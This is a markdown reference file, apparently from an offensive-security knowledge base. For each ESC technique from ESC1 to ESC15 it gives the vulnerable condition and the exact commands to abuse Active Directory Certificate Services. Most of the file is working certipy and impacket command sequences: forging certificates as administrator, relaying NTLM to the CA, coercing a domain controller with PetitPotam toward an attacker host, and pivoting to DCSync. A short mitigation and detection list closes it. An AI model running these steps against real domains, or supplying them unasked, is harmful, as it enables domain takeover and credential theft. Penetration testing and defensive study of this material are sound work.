# ADCS ESC Attacks — Deep Reference (ESC1–ESC11+)

> Per-ESC reference for Active Directory Certificate Services abuse.
> Maps to MITRE ATT&CK T1649 (Steal or Forge Authentication Certificates) and TA0004/TA0006.
> `credential-access-ad.md` and `playbooks/adcs-and-shadow-creds.md` cover the *when/why*.
> This file covers the *exact condition + find + exploit* for each ESC.

All commands assume `certipy-ad` (the maintained fork; binary is `certipy`). Placeholders match
`knowledge-base/tools/ad-abuse-commands.md`: `USER`/`PASS`, `domain.tld`, `DC_IP`, `CA-NAME`.

---

## Step 0: Find everything vulnerable

```bash
certipy find -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# Full picture (templates, CAs, ACLs) → JSON/BloodHound:
certipy find -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -old-bloodhound
```

`certipy find` labels each finding with its ESC id. Read the CA name and template name from the
output — you feed them into `certipy req`. If pre-auth/LDAP is Kerberos-only, add `-k` and set
`KRB5CCNAME`.

The universal exploit shape: **request a cert as a privileged identity → authenticate with it →
receive that identity's NT hash / TGT.**

```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP    # PKINIT → TGT + NT hash of the target
```

---

## ESC1 — Enrollee-supplied SAN on a client-auth template

**Vulnerable condition:** template has `ENROLLEE_SUPPLIES_SUBJECT`, EKU allows client auth
(Client Authentication / PKINIT / Smart Card Logon / Any Purpose), low-priv users can enroll,
and manager approval is not required.

**Exploit:** request a cert for that template but set the UPN to a privileged user.
```bash
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP \
  -ca CA-NAME -template VULN-TEMPLATE -upn administrator@domain.tld
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```
For a computer/DA-equivalent, use `-upn 'DC$@domain.tld'` (add `-dns dc.domain.tld` if the KDC
requires it). Result → NT hash → DCSync (see `ad-decision-runbook.md` STATE D).

---

## ESC2 — Any Purpose (or no) EKU

**Vulnerable condition:** template EKU is `Any Purpose` (OID 2.5.29.37.0) or empty, and low-priv
users can enroll. Such a cert authenticates as any purpose, including client auth.

**Exploit:** same as ESC1 when the template also allows SAN; otherwise use the cert directly for
whatever EKU you need. If SAN is not supplied, chain via an enrollment-agent flow (ESC3-style).
```bash
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template VULN-TEMPLATE
```

---

## ESC3 — Enrollment Agent certificate

**Vulnerable condition:** a template grants the `Certificate Request Agent` EKU
(OID 1.3.6.1.4.1.311.20.2.1) to low-priv enrollees.

**Exploit:** get an enrollment-agent cert, then request a cert *on behalf of* a privileged user.
```bash
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template VULN-AGENT-TEMPLATE
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template User \
  -on-behalf-of 'DOMAIN\administrator' -pfx USER.pfx
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC4 — Vulnerable template ACL (write access to the template)

**Vulnerable condition:** you hold `WriteDacl`/`WriteOwner`/`GenericWrite`/`GenericAll` over a
certificate *template* object.

**Exploit:** rewrite the template into an ESC1 config, exploit as ESC1, then restore.
```bash
certipy template -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP \
  -template VULN-TEMPLATE -write-default-configuration -save-old   # makes it ESC1-abusable, saves backup
# now exploit exactly like ESC1:
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template VULN-TEMPLATE -upn administrator@domain.tld
certipy auth -pfx administrator.pfx -dc-ip DC_IP
# restore:
certipy template -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -template VULN-TEMPLATE -configuration VULN-TEMPLATE.json
```

---

## ESC5 — Vulnerable PKI object ACL

**Vulnerable condition:** you control (write) a PKI-related object outside templates: the CA
computer object, the CA's `NTAuthCertificates`/`Enrollment Services` container, or the CA server's
AD computer account.

**Exploit:** leverage that control (e.g. RBCD/shadow-creds on the CA host, or edit CA config) to
reach an ESC1/ESC6/ESC7 primitive. There is no single command — treat the controlled object like
any other high-value ACL win (`bloodhound-edge-to-action.md`), then pivot into certificate abuse.

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA

**Vulnerable condition:** the CA has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set — then *any*
client-auth template lets the requester specify an arbitrary SAN, even without ESC1 on the template.

**Exploit:** request any enrollable client-auth template with `-upn` (same as ESC1). `certipy find`
flags the CA flag. Note: post-May-2022 patches (certificate mapping enforcement) blunt this on
patched DCs.
```bash
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template User -upn administrator@domain.tld
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

---

## ESC7 — Vulnerable CA ACL (ManageCA / ManageCertificates)

**Vulnerable condition:** you hold `ManageCA` or `Manage Certificates` rights on the CA itself.

**Exploit:** two common paths.
- Add yourself as an officer, enable the `SubCA` template, request it (request fails), then approve
  your own failed request and retrieve it:
```bash
certipy ca -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -add-officer USER
certipy ca -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -enable-template SubCA
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -template SubCA -upn administrator@domain.tld
# request denied → note the request ID, then issue it:
certipy ca -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -issue-request REQUEST_ID
certipy req -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -ca CA-NAME -retrieve REQUEST_ID
```
- With `ManageCA`, you can also flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag to create ESC6.

---

## ESC8 — NTLM relay to the CA HTTP(S) enrollment endpoint

**Vulnerable condition:** the CA exposes the web enrollment interface
(`http://ca/certsrv/certfnsh.asp`) or CES over HTTP, and NTLM is accepted (no EPA/HTTPS-channel-
binding). This is the flagship coercion+relay path.

**Exploit:** relay a coerced machine (usually the DC) to the CA's enrollment URL and get a cert as
that machine, then PKINIT.
```bash
certipy relay -target 'http://CA_HOST' -template DomainController        # certipy's built-in relay
# --- or with impacket ---
impacket-ntlmrelayx -t http://CA_HOST/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# then coerce the DC to authenticate to your relay (see ad-coercion-and-relay.md):
python3 PetitPotam.py -u USER -p PASS -d domain.tld ATTACKER_IP DC_IP
certipy auth -pfx dc.pfx -dc-ip DC_IP                                     # → DC$ TGT → DCSync
```
Full coercion + relay-target detail: `knowledge-base/checklists/ad-coercion-and-relay.md`.

---

## ESC9 — No security extension (msPKI-Enrollment-Flag: NO_SECURITY_EXTENSION)

**Vulnerable condition:** a template sets `CT_FLAG_NO_SECURITY_EXTENSION`, so the issued cert omits
the SID security extension — certificate mapping falls back to UPN. Requires `GenericWrite` (or
similar) over a victim account whose UPN you can set to a target.

**Exploit:** set the victim's UPN to the target (e.g. administrator), enroll as the victim, revert UPN, authenticate.
```bash
certipy account update -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -user VICTIM -upn administrator
certipy req -u 'VICTIM@domain.tld' -p 'VICTIMPASS' -dc-ip DC_IP -ca CA-NAME -template ESC9-TEMPLATE
certipy account update -u 'USER@domain.tld' -p 'PASS' -dc-ip DC_IP -user VICTIM -upn victim@domain.tld  # revert
certipy auth -pfx administrator.pfx -dc-ip DC_IP -domain domain.tld
```

---

## ESC10 — Weak certificate mappings

**Vulnerable condition:** registry weakens mapping — either
`CertificateMappingMethods = 0x4` (UPN mapping) on the DC, or
`StrongCertificateBindingEnforcement = 0` under Kdc. Similar UPN-swap abuse as ESC9, but driven by
DC config rather than the template flag.

**Exploit:** same UPN-manipulation flow as ESC9 (set victim UPN to target → enroll any client-auth
template → revert → `certipy auth`). Case 2 (Schannel) additionally enables relay-to-LDAP mapping abuse.

---

## ESC11 — Relay to CA RPC (ICertPassage / no encryption enforced)

**Vulnerable condition:** the CA's RPC enrollment interface does not enforce packet privacy
(`IF_ENFORCEENCRYPTICERTREQUEST` unset) — NTLM can be relayed to RPC to enroll.

**Exploit:**
```bash
certipy relay -target 'rpc://CA_HOST' -template DomainController
# then coerce the DC as in ESC8, and certipy auth -pfx dc.pfx
```

---

## ESC13+ (as applicable)

- **ESC13** — a template linked to an *issuance policy* that maps to a privileged group: enrolling
  yields effective membership of that group. `certipy find` flags it; exploit is a normal
  `certipy req` for the template, then authenticate.
- **ESC14/15 (CVE-2024-49019 "EKUwu")** — application-policy/enrollee-SAN edge cases on legacy V1
  templates; check `certipy find` output and treat like ESC1 when flagged.

Do not chase ESCs `certipy find` did not report. Confirm the exact ESC id first, then use only that
section.

---

## Detection / Mitigation (defensive framing for the thesis)

- Remove `ENROLLEE_SUPPLIES_SUBJECT` from client-auth templates (kills ESC1/ESC6).
- Require **manager approval** or authorized-signature on sensitive templates.
- Tighten template and CA ACLs; audit `WriteDacl`/`ManageCA`/`Manage Certificates` (ESC4/ESC5/ESC7).
- Disable web enrollment or enforce **HTTPS + Extended Protection for Authentication (EPA)** and
  `IF_ENFORCEENCRYPTICERTREQUEST` (ESC8/ESC11).
- Apply the May 2022 patches and set `StrongCertificateBindingEnforcement = 2` (ESC9/ESC10).
- Monitor AD CS event IDs 4886/4887 (request/issue) and correlate issued SANs against requester
  identity. Alert on machine accounts enrolling client-auth certs.
